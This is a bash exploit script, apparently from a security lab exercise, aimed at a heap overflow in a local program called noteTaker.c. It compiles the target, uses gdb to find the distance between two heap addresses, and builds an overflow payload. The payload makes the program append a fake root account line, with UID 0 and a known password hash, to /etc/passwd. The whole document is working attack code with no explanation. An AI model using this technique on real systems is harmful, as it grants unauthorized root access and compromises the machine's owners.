#!/bin/bash

####
# Exploit uses heap overflow weakness of file noteTaker.c
####

password=$(perl -e 'print crypt("hesielko", "AA") . "\n"')
etcShaddowEntryBeg="fakeRo:$password:0:0:"
etcShadowEntryEnd=":/root:/tmp"
fileToWrite="/etc/passwd"

mkdir /tmp/etc 2> /dev/null
ln -s /bin/bash /tmp/etc/passwd 2> /dev/null

gcc -g "./noteTaker.c" -o "./noteTaker" 2> /dev/null

gdb -batch -ex "file ./noteTaker" -ex "break noteTaker.c:38" -ex "run test" -ex "print datafile" -ex "print buffer" -ex "exit" -ex "y" > output.txt

dataFileAddress=$(sed -n '7p' output.txt | grep -o '0x[a-f0-9]\+')
bufferAddress=$(sed -n '8p' output.txt | grep -o '0x[a-f0-9]\+')

rm output.txt

echo "Data file address: $dataFileAddress"
echo "Buffer address: $bufferAddress"

output=$(gdb -batch -ex "print ($dataFileAddress - $bufferAddress)" -ex "quit")

difference=$(echo "$output" | grep -oP '\=\s*\K[0-9]+')
difference=$((difference + 1))

countChars=$(echo $etcShaddowEntryBeg$etcShadowEntryEnd | wc -c)
echo "$countChars"

balast=$((difference - countChars))

echo "Result of subtraction: $balast"

./noteTaker $(perl -e 'print "'$etcShaddowEntryBeg'" . "A"x'$balast' . "'$etcShadowEntryEnd'" . "'$fileToWrite'"')